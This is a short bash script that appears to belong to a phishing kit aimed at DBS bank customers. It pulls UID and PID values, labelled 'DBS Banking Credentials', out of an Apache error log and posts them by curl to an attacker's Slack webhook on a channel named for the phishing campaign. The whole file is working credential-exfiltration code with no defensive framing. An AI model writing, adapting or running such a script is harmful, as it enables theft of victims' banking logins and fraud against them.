#!/usr/bin/env bash
#Main program
slackwebhook="PASTE_YOUR_WEBHOOK_HERE"
read -d '' payload << EOF
{
	"channel": "#nus-phishing-dbs",
	"attachments": [
	    {
		"color": "good",
		"title": "DBS Banking Credentials", 
		"fields": [{
			"value": "$(cat /var/log/apache2/error.log | grep -e UID -e PID | sed 's/^.*://')",
			"short": false
		}]
	    }
	]
    }
EOF

curl -X POST -H 'Content-type: application/json' --data "${payload}" ${slackwebhook}
